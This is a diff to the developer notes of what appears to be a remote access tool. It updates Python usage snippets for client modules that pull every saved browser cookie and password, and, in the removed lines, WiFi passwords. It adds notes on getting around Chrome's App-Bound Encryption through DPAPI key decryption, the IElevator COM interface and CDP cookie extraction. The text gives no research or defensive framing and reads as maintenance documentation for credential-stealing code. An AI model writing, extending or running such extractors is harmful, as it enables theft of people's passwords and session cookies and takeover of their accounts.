@@ -83,22 +83,25 @@ cd server/app && python signaling_server.py
 
 ```python
 # Extract all browser cookies
-from client.remote_client.cookie_extractor import CookieExporter
+from remote_client.cookie_extractor import CookieExporter
 exporter = CookieExporter()
-cookies = exporter.export_all()
+cookies = exporter.export_payload()  # Returns dict with cookies
 
-# Extract all credentials
-from password_extractor.extractor import extract_all_credentials, export_credentials_json
-result = extract_all_credentials()
-json_output = export_credentials_json(result)
+# Extract all browser passwords
+from password_extractor.extractor import PasswordExtractor, extract_all_browser_passwords
+extractor = PasswordExtractor()
+passwords = extractor.extract_all()  # dict[str, list[ExtractedPassword]]
 
-# Get installed browsers
-from password_extractor.extractor import get_installed_browsers
-browsers = get_installed_browsers()  # ['chrome', 'edge', 'firefox', ...]
+# Or use convenience function
+passwords_dict = extract_all_browser_passwords()  # dict[str, list[dict]]
 
-# Extract WiFi passwords
-from password_extractor.extractor import extract_wifi_passwords
-wifi = extract_wifi_passwords()  # List[WiFiPassword]
+# Extract passwords from specific browser
+from password_extractor.extractor import extract_passwords
+chrome_passwords = extract_passwords("chrome")  # list[dict]
+
+# Check password decryption status
+from password_extractor.extractor import get_password_decryption_status
+status = get_password_decryption_status()
 ```
 
 ## Notes for Future Development
@@ -108,3 +111,15 @@ wifi = extract_wifi_passwords()  # List[WiFiPassword]
 - Dual-stream controls appear automatically when two video tracks are received
 - CDP is preferred over IElevator for Chrome 127+ (more reliable)
 - Firefox password decryption requires NSS library for full key4.db support
+
+## ABE Module Important Notes
+
+The `app_bound_encryption.py` module must export these functions for `abe_status.py` to work:
+- `decrypt_v20_value()` - Decrypt v20 encrypted cookie values
+- `decrypt_abe_key_with_dpapi()` - DPAPI-based key decryption
+- `_try_ielevator_com_decrypt()` - Chrome IElevator COM interface
+- `check_abe_support()` - Check system ABE support
+- `try_cdp_cookie_extraction()` - CDP cookie extraction
+- `CDPCookieExtractor` - CDP extractor class
+
+If integrating C++ native modules, ensure these Python fallback functions remain available.
